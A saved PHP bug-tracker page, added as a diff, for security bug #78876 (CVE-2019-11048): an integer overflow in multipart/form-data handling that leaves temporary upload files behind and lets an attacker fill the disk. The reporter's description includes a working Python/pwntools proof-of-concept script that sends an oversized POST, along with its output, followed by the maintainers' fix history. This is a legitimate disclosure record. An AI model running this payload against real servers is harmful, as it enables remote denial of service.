@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
+html {
+    background-color: var(--darkreader-background-ffffff, #181a1b) !important;
+}
+html {
+    color-scheme: dark !important;
+}
+iframe {
+    color-scheme: dark !important;
+}
+html, body {
+    background-color: var(--darkreader-background-ffffff, #181a1b);
+}
+html, body {
+    border-color: var(--darkreader-border-4c4c4c, #736b5e);
+    color: var(--darkreader-text-000000, #e8e6e3);
+}
+a {
+    color: var(--darkreader-text-0040ff, #3391ff);
+}
+table {
+    border-color: var(--darkreader-border-808080, #545b5e);
+}
+mark {
+    color: var(--darkreader-text-000000, #e8e6e3);
+}
+::placeholder {
+    color: var(--darkreader-text-a9a9a9, #b2aba1);
+}
+input:-webkit-autofill,
+textarea:-webkit-autofill,
+select:-webkit-autofill {
+    background-color: var(--darkreader-background-faffbd, #404400) !important;
+    color: var(--darkreader-text-000000, #e8e6e3) !important;
+}
+::selection {
+    background-color: var(--darkreader-background-0060d4, #004daa) !important;
+    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
+}
+::-moz-selection {
+    background-color: var(--darkreader-background-0060d4, #004daa) !important;
+    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
+}
+}</style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, img.Wirisformula, a[data-testid="headerMediumLogo"]>svg, .d2l-navigation-link-image-container, .d2l-iframe-loading-container {
+    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
+}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
+  background-color: var(--darkreader-inline-bgcolor) !important;
+}
+[data-darkreader-inline-bgimage] {
+  background-image: var(--darkreader-inline-bgimage) !important;
+}
+[data-darkreader-inline-border] {
+  border-color: var(--darkreader-inline-border) !important;
+}
+[data-darkreader-inline-border-bottom] {
+  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
+}
+[data-darkreader-inline-border-left] {
+  border-left-color: var(--darkreader-inline-border-left) !important;
+}
+[data-darkreader-inline-border-right] {
+  border-right-color: var(--darkreader-inline-border-right) !important;
+}
+[data-darkreader-inline-border-top] {
+  border-top-color: var(--darkreader-inline-border-top) !important;
+}
+[data-darkreader-inline-boxshadow] {
+  box-shadow: var(--darkreader-inline-boxshadow) !important;
+}
+[data-darkreader-inline-color] {
+  color: var(--darkreader-inline-color) !important;
+}
+[data-darkreader-inline-fill] {
+  fill: var(--darkreader-inline-fill) !important;
+}
+[data-darkreader-inline-stroke] {
+  stroke: var(--darkreader-inline-stroke) !important;
+}
+[data-darkreader-inline-outline] {
+  outline-color: var(--darkreader-inline-outline) !important;
+}
+[data-darkreader-inline-stopcolor] {
+  stop-color: var(--darkreader-inline-stopcolor) !important;
+}
+[data-darkreader-inline-bg] {
+  background: var(--darkreader-inline-bg) !important;
+}
+[data-darkreader-inline-border-short] {
+  border: var(--darkreader-inline-border-short) !important;
+}
+[data-darkreader-inline-border-bottom-short] {
+  border-bottom: var(--darkreader-inline-border-bottom-short) !important;
+}
+[data-darkreader-inline-border-left-short] {
+  border-left: var(--darkreader-inline-border-left-short) !important;
+}
+[data-darkreader-inline-border-right-short] {
+  border-right: var(--darkreader-inline-border-right-short) !important;
+}
+[data-darkreader-inline-border-top-short] {
+  border-top: var(--darkreader-inline-border-top-short) !important;
+}
+[data-darkreader-inline-invert] {
+    filter: invert(100%) hue-rotate(180deg);
+}</style><style class="darkreader darkreader--variables" media="screen">:root {
+   --darkreader-neutral-background: var(--darkreader-background-ffffff, #181a1b);
+   --darkreader-neutral-text: var(--darkreader-text-000000, #e8e6e3);
+   --darkreader-selection-background: var(--darkreader-background-0060d4, #004daa);
+   --darkreader-selection-text: var(--darkreader-text-ffffff, #e8e6e3);
+}</style><style class="darkreader darkreader--root-vars" media="screen"></style>
+    <meta charset="utf-8">
+    
+        <link rel="alternate" type="application/rss+xml" title="*Web Server problem Bug #78876 - RDF" href="https://bugs.php.net/rss/bug.php?id=78876">
+        <link rel="alternate" type="application/rss+xml" title="*Web Server problem Bug #78876 - RSS 2.0" href="https://bugs.php.net/rss/bug.php?id=78876&amp;format=rss2">
+        <!-- base href="https://bugs.php.net/" -->
+    <title>PHP :: Sec Bug #78876 :: Long variables in multipart/form-data cause OOM and temp files are not cleaned</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="php-bug-78876_files/style_h4WG.css"><style class="darkreader darkreader--sync" media="screen"></style>
+<meta name="darkreader" content="6388f59e02d3426994910dc5814a5cd4"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
+    background-color: var(--darkreader-background-ffd76e, #684b00) !important;
+    border-color: var(--darkreader-background-c59d00, #9e7e00) !important;
+    color: var(--darkreader-text-302505, #d7d4cf) !important;
+}
+#vimvixen-console-frame {
+    color-scheme: light !important;
+}
+::placeholder {
+    opacity: 0.5 !important;
+}
+#edge-translate-panel-body,
+.MuiTypography-body1,
+.nfe-quote-text {
+    color: var(--darkreader-neutral-text) !important;
+}
+gr-main-header {
+    background-color: var(--darkreader-background-add8e6, #1b4958) !important;
+}
+.tou-z65h9k,
+.tou-mignzq,
+.tou-1b6i2ox,
+.tou-lnqlqk {
+    background-color: var(--darkreader-neutral-background) !important;
+}
+.tou-75mvi {
+    background-color: var(--darkreader-background-cfecf5, #0f3a47) !important;
+}
+.tou-ta9e87,
+.tou-1w3fhi0,
+.tou-1b8t2us,
+.tou-py7lfi,
+.tou-1lpmd9d,
+.tou-1frrtv8,
+.tou-17ezmgn {
+    background-color: var(--darkreader-background-f5f5f5, #1e2021) !important;
+}
+.tou-uknfeu {
+    background-color: var(--darkreader-background-faedda, #432c09) !important;
+}
+.tou-6i3zyv {
+    background-color: var(--darkreader-background-85c3d8, #245d70) !important;
+}
+div.mermaid-viewer-control-panel .btn {
+    background-color: var(--darkreader-neutral-background);
+    fill: var(--darkreader-neutral-text);
+}
+svg g rect.er {
+    fill: var(--darkreader-neutral-background) !important;
+}
+svg g rect.er.entityBox {
+    fill: var(--darkreader-neutral-background) !important;
+}
+svg g rect.er.attributeBoxOdd {
+    fill: var(--darkreader-neutral-background) !important;
+}
+svg g rect.er.attributeBoxEven {
+    fill: var(--darkreader-selection-background);
+    fill-opacity: 0.8 !important;
+}
+svg rect.er.relationshipLabelBox {
+    fill: var(--darkreader-neutral-background) !important;
+}
+svg g g.nodes rect,
+svg g g.nodes polygon {
+    fill: var(--darkreader-neutral-background) !important;
+}
+svg g rect.task {
+    fill: var(--darkreader-selection-background) !important;
+}
+svg line.messageLine0,
+svg line.messageLine1 {
+    stroke: var(--darkreader-neutral-text) !important;
+}
+div.mermaid .actor {
+    fill: var(--darkreader-neutral-background) !important;
+}
+mitid-authenticators-code-app > .code-app-container {
+    background-color: white !important;
+    padding-top: 1rem;
+}
+iframe#unpaywall[src$="unpaywall.html"] {
+    color-scheme: light !important;
+}
+select {
+    --darkreader-bg--form-control-background-color: rgba(22, 22, 22, 0) !important;
+}
+select * {
+    background-color: var(--darkreader-neutral-background) !important;
+}
+body#tumblr {
+    --darkreader-bg--secondary-accent: 31, 32, 34 !important;
+    --darkreader-bg--white: 23, 23, 23 !important;
+    --darkreader-text--black: 228, 224, 218 !important;
+}
+:host {
+    --d2l-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
+    --d2l-button-icon-background-color-hover: var(--darkreader-bg--d2l-color-gypsum) !important;
+    --d2l-color-ferrite: var(--darkreader-neutral-text) !important;
+    --d2l-color-sylvite: var(--darkreader-bg--d2l-color-sylvite) !important;
+    --d2l-dropdown-background-color: var(--darkreader-neutral-background) !important;
+    --d2l-dropdown-border-color: var(--darkreader-border--d2l-color-mica) !important;
+    --d2l-input-backgroud-color: var(--darkreader-neutral-background) !important;
+    --d2l-menu-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
+    --d2l-tooltip-background-color: var(--darkreader-neutral-background) !important;
+    --d2l-tooltip-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
+}
+:host([_floating]) .d2l-floating-buttons-container {
+    background-color: var(--darkreader-neutral-background) !important;
+    border-top-color: var(--darkreader-border--d2l-color-mica) !important;
+    opacity: 0.88 !important;
+}
+d2l-card {
+    background: var(--darkreader-neutral-background) !important;
+    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
+}
+d2l-dropdown-content > div,
+d2l-menu-item {
+    background-color: var(--darkreader-neutral-background) !important;
+    border-radius: 10px !important;
+}
+d2l-empty-state-simple {
+    border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
+}
+.d2l-button-filter > ul > li > a.vui-button {
+    border-color: var(--darkreader-border--d2l-color-mica) !important;
+}
+.d2l-label-text:has(.d2l-button-subtle-content):hover,
+.d2l-label-text:has(.d2l-button-subtle-content):focus,
+.d2l-label-text:has(.d2l-button-subtle-content):active {
+    background-color: var(--darkreader-bg--d2l-color-gypsum) !important;
+}
+.d2l-navigation-centerer {
+    color: inherit !important;
+}
+.d2l-tabs-layout {
+    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
+}
+.d2l-input,
+.d2l-calendar-date,
+.d2l-htmleditor-container {
+    background-color: var(--darkreader-neutral-background) !important;
+}
+.d2l-collapsible-panel {
+    border: 1px solid var(--darkreader-border--d2l-color-mica) !important;
+    border-radius: 0.4rem !important;
+}
+.d2l-collapsible-panel-divider {
+    border-bottom: 1px solid var(--darkreader-border--d2l-color-mica) !important;
+}
+.d2l-w2d-flex {
+    border-bottom: 2px solid var(--darkreader-border--d2l-color-mica) !important;
+}
+.d2l-collapsible-panel scrolled,
+.d2l-collapsible-panel-header,
+.d2l-w2d-collection-fixed {
+    background-color: var(--darkreader-neutral-background) !important;
+}
+.d2l-loading-spinner-bg {
+    fill: var(--darkreader-bg--d2l-color-gypsum) !important;
+}
+.d2l-loading-spinner-bg-stroke {
+    stroke: var(--darkreader-border--d2l-color-mica) !important;
+}
+.d2l-loading-spinner-wrapper svg path,
+.d2l-loading-spinner-wrapper svg circle {
+    fill: var(--darkreader-neutral-background) !important;
+}
+embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style></head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tbody><tr>
+        <td class="head-logo">
+            <a href="https://bugs.php.net/"><img src="php-bug-78876_files/logo_h4WG.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="https://bugs.php.net/report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="https://bugs.php.net/search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="https://bugs.php.net/search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="https://bugs.php.net/stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="https://bugs.php.net/random">random bug</a>&nbsp;|&nbsp;
+            <a href="https://bugs.php.net/login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" size="30">
+                    <input type="image" src="php-bug-78876_files/small_submit_white_h4WG.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</tbody></table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tbody><tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tbody><tr id="title">
+            <th class="details" id="number"><a href="https://bugs.php.net/bug.php?id=78876">Sec Bug</a>&nbsp;#78876</th>
+            <td id="summary" colspan="5">Long variables in multipart/form-data cause OOM and temp files are not cleaned</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2019-11-28 11:07 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2020-05-11 21:22 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>jr at coredu dot mp</td>
+            <th class="details">Assigned:</th>
+            <td><a href="https://bugs.php.net/search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="https://bugs.php.net/search.php?cmd=display&amp;package_name[]=%2AWeb+Server+problem">*Web Server problem</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>7.2.25</td>
+            <th class="details">OS:</th>
+            <td>ALL</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11048" target="_blank">2019-11048</a></td>
+        </tr>
+    </tbody></table>
+</div>
+
+<div class="controls">
+<span id="control_0" class="control active">View</span>
+<span id="control_1" class="control"><a href="https://bugs.php.net/bug.php?id=78876&amp;edit=1">Developer</a></span>
+<span id="control_2" class="control"><a href="https://bugs.php.net/bug.php?id=78876&amp;edit=2">Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class="comment type_comment"><a name="1574939256">&nbsp;</a><strong>[2019-11-28 11:07 UTC] jr at coredu dot mp</strong>
+<pre class="note">Description:
+------------
+There is a bug in php-src/main/rfc1867.c that allows a malicious user to crash php during a multipart/form-data file upload. A large multipart/form-data variable causes an integer overflow that leads to a subsequent crash.
+The problem is that if multiple files are uploaded at the same time and the bug is triggered with one of the later files,all previous temp files will not be deleted and fill up the disk. This could be used for a easy to execute remote denial of service attack.
+
+Required php.ini settings:
+
+; post_max_size needs to be at least 2GB + a few additional bytes for the rest of the form (this depends on the exact POC)
+; For the POC attached to this bug report, please use 2147483839 or more.
+post_max_size = 2147483839
+; this could be remotely set with the MAX_FILE_SIZE form variable but in order to keep the POC as simple as possible, I did not do this
+; so set upload_max_filesize to 0
+upload_max_filesize = 0
+; according to documentation, memory_limit should always be larger than post_max_size so I set it to 4GB to be on the safe side
+memory_limit = 4GB
+
+
+The security issue exists in SAPI_API SAPI_POST_HANDLER_FUNC(rfc1867_post_handler) in the handling of large variables:
+
+
+/* Normal form variable, safe to read all data into memory */
+if (!filename &amp;&amp; param) {
+    size_t value_len;
+    char *value = multipart_buffer_read_body(mbuff, &amp;value_len);
+    size_t new_val_len; /* Dummy variable */
+
+    if (!value) {
+        value = estrdup("");
+        value_len = 0;
+    }
+
+...
+
+static char *multipart_buffer_read_body(multipart_buffer *self, size_t *len)
+{
+	char buf[FILLUNIT], *out=NULL;
+	int total_bytes=0, read_bytes=0;
+
+	while((read_bytes = multipart_buffer_read(self, buf, sizeof(buf), NULL))) {
+		out = erealloc(out, total_bytes + read_bytes + 1);
+		memcpy(out + total_bytes, buf, read_bytes);
+		total_bytes += read_bytes;
+	}
+
+	if (out) {
+		out[total_bytes] = '\0';
+	}
+	*len = total_bytes;
+
+	return out;
+}
+
+The problem is that the total_bytes variable has the type of a signed integer. If the variable is large enough to overflow it, total_bytes will
+be negative. This causes the erealloc() to fail because it will be converted to a extremely large 64 bit integer.
+Subsequently, the script apruptly exits and the already uploaded temporary files are not deleted.
+
+Example run of attached POC:
+
+root@vagrant:/var/www/html# ls /tmp/php*
+ls: cannot access '/tmp/php*': No such file or directory
+root@vagrant:/var/www/html# python multipart_var_oom_crash.py 
+[+] Opening connection to 127.0.0.1 on port 80: Done
+sending payload with size 2147483839
+[*] Switching to interactive mode
+HTTP/1.1 502 Bad Gateway
+Server: nginx/1.14.0 (Ubuntu)
+Date: Mon, 18 Nov 2019 05:43:50 GMT
+Content-Type: text/html
+Content-Length: 182
+Connection: keep-alive
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;502 Bad Gateway&lt;/title&gt;&lt;/head&gt;
+&lt;body bgcolor="white"&gt;
+&lt;center&gt;&lt;h1&gt;502 Bad Gateway&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.14.0 (Ubuntu)&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+$ 
+[*] Closed connection to 127.0.0.1 port 80
+root@vagrant:/var/www/html# ls /tmp/php*
+/tmp/php3kyNzA
+root@vagrant:/var/www/html# cat /tmp/php3kyNzA 
+testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttestroot@vagrant:/var/www/html# 
+
+Please note that the python POC requires the pwntools library (pip install pwntools).
+It posts to localhost:80/poc.php - modify the http request if required, the contents of poc.php do not matter.
+
+
+Test script:
+---------------
+#!/usr/bin/env python
+
+from pwn import *
+
+r = remote("127.0.0.1", 80)
+
+boundary = "FOO"
+
+def line(s):
+    return "%s\n" %s
+
+buf2 = ""
+buf2 += line("--"+boundary)
+buf2 += line('Content-Disposition: form-data; name="test"; filename="test"')
+buf2 += line("")
+buf2 += line("test"*0x10)
+buf2 += line("--"+boundary)
+buf2 += line('Content-Disposition: form-data; name="foo"')
+buf2 += line("")
+buf2 += line("a"*0x7FFFFFFF)
+buf2 += line("--"+boundary+"--")
+
+buf = ""
+buf += "POST /poc.php HTTP/1.1\n"
+buf += "Host: localhost\n"
+buf += "Content-Type: multipart/form-data; boundary=%s\n" % boundary
+buf += "Content-Length: %d\n" % len(buf2)
+buf += "\n"
+
+print "sending payload with size %d" % len(buf2)
+r.send(buf + buf2)
+r.interactive()
+
+Expected result:
+----------------
+php should not crash, the temporary file should be deleted
+
+Actual result:
+--------------
+php crashes, the temporary file is not deleted
+
+</pre>
+</div><h2>Patches</h2>
+<h2>Pull Requests</h2>
+<h2 style="border-bottom: 2px solid rgb(102, 102, 102); margin-bottom: 0px; padding: 5px 0px; --darkreader-inline-border-bottom: var(--darkreader-border-666666, #6a6357);" data-darkreader-inline-border-bottom="">History</h2><div id="comment_filter" class="controls comments"><span id="type_all" class="control active" onclick="do_comment(this);">All</span><span id="type_comment" class="control " onclick="do_comment(this);">Comments</span><span id="type_log" class="control " onclick="do_comment(this);">Changes</span><span id="type_svn" class="control " onclick="do_comment(this);">Git/SVN commits</span><span id="type_related" class="control " onclick="do_comment(this);">Related reports</span>            </div>
+            <div id="comments_view" style="clear:both;">
+<div class="comment type_log"><a name="1575002070">&nbsp;</a><strong>[2019-11-29 04:34 UTC] <a href="https://people.php.net/stas">stas@php.net</a></strong>
+<div class="log_note"><div class="changeset">
+<span class="removed">-Summary: Long variables in multipart/form-data crash PHP and
+          lead to disk exhaustion</span>
+<span class="added">+Summary: Long variables in multipart/form-data cause OOM and
+          temp files are not cleaned</span>
+</div></div></div><div class="comment type_comment"><a name="1575002070">&nbsp;</a><strong>[2019-11-29 04:34 UTC] <a href="https://people.php.net/stas">stas@php.net</a></strong>
+<pre class="note">Allocation failure strictly speaking is not a crash, but not cleaning up temp file may be indeed bad and cause DOS.
+</pre>
+</div><div class="comment type_log"><a name="1575002097">&nbsp;</a><strong>[2019-11-29 04:34 UTC] <a href="https://people.php.net/stas">stas@php.net</a></strong>
+<div class="log_note"><div class="changeset">
+<span class="removed">-Package: Reproducible crash</span>
+<span class="added">+Package: *Web Server problem</span>
+</div></div></div><div class="comment type_log"><a name="1576484458">&nbsp;</a><strong>[2019-12-16 08:20 UTC] <a href="https://people.php.net/stas">stas@php.net</a></strong>
+<div class="log_note"><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2019-11048</span>
+</div></div></div><div class="comment type_log"><a name="1584523758">&nbsp;</a><strong>[2020-03-18 09:29 UTC] <a href="https://people.php.net/cmb">cmb@php.net</a></strong>
+<div class="log_note"><div class="changeset">
+<span class="removed">-Status:      Open</span>
+<span class="added">+Status:      Verified</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class="comment type_comment"><a name="1584523758">&nbsp;</a><strong>[2020-03-18 09:29 UTC] <a href="https://people.php.net/cmb">cmb@php.net</a></strong>
+<pre class="note">Suggested fix:
+&lt;<a href="https://gist.github.com/cmb69/384d5f5bb6b2de834877348dcdbe3282" rel="nofollow">https://gist.github.com/cmb69/384d5f5bb6b2de834877348dcdbe3282</a>&gt;.
+
+@jr, could you please confirm that the patch fixes the bug?
+</pre>
+</div><div class="comment type_log"><a name="1584523840">&nbsp;</a><strong>[2020-03-18 09:30 UTC] <a href="https://people.php.net/cmb">cmb@php.net</a></strong>
+<div class="log_note"><div class="changeset">
+<span class="removed">-Status:      Verified</span>
+<span class="added">+Status:      Open</span>
+<span class="removed">-Assigned To: stas</span>
+<span class="added">+Assigned To:</span>
+</div></div></div><div class="comment type_comment"><a name="1584523840">&nbsp;</a><strong>[2020-03-18 09:30 UTC] <a href="https://people.php.net/cmb">cmb@php.net</a></strong>
+<pre class="note">Oops, the patch is meant for <a href="https://bugs.php.net/bug.php?id=78875">bug #78875</a>.  Sorry for the noise.
+</pre>
+</div><div class="comment type_log"><a name="1584525583">&nbsp;</a><strong>[2020-03-18 09:59 UTC] <a href="https://people.php.net/cmb">cmb@php.net</a></strong>
+<div class="log_note"><div class="changeset">
+<span class="removed">-Status:      Open</span>
+<span class="added">+Status:      Verified</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class="comment type_comment"><a name="1584525583">&nbsp;</a><strong>[2020-03-18 09:59 UTC] <a href="https://people.php.net/cmb">cmb@php.net</a></strong>
+<pre class="note">Suggested fix for this issue:
+&lt;<a href="https://gist.github.com/cmb69/94d3993ad9e2ee5d2ddabff18f6a86b8" rel="nofollow">https://gist.github.com/cmb69/94d3993ad9e2ee5d2ddabff18f6a86b8</a>&gt;
+
+@jr, could you please confirm that the patch fixes the bug?
+</pre>
+</div><div class="comment type_comment"><a name="1587455455">&nbsp;</a><strong>[2020-04-21 07:50 UTC] jr at coredu dot mp</strong>
+<pre class="note">Patch looks good, this should fix the crash. Thanks!
+</pre>
+</div><div class="comment type_svn"><a name="1589232170">&nbsp;</a><strong>[2020-05-11 21:22 UTC] <a href="https://people.php.net/stas">stas@php.net</a></strong>
+<pre class="note">Automatic comment on behalf of cmbecker69@gmx.de
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3c8582ca4b8e84e5647220b647914876d2c3b124" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3c8582ca4b8e84e5647220b647914876d2c3b124</a>
+Log: Fix #78876: Long variables cause OOM and temp files are not cleaned
+</pre>
+</div><div class="comment type_log"><a name="1589232170">&nbsp;</a><strong>[2020-05-11 21:22 UTC] <a href="https://people.php.net/stas">stas@php.net</a></strong>
+<div class="log_note"><div class="changeset">
+<span class="removed">-Status: Verified</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class="comment type_svn"><a name="1589266943">&nbsp;</a><strong>[2020-05-12 07:02 UTC] <a href="https://people.php.net/cmb">cmb@php.net</a></strong>
+<pre class="note">Automatic comment on behalf of cmbecker69@gmx.de
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8fd927768991df88df0c338b2b7c29e490392430" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8fd927768991df88df0c338b2b7c29e490392430</a>
+Log: Fix #78876: Long variables cause OOM and temp files are not cleaned
+</pre>
+</div></div>
+        </td>
+    </tr>
+</tbody></table>
+
+<script src="php-bug-78876_files/util_h4WG.js"></script>
+<script src="php-bug-78876_files/jquery.min_h4WG.js"></script>
+<script src="php-bug-78876_files/jquery.cookie_h4WG.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tbody><tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="php-bug-78876_files/logo-small_h4WG.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright © 2001-2026 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Thu Oct 22 01:00:02 2026 UTC</small>
+        </td>
+    </tr>
+</tbody></table>
+
+
+</body></html>
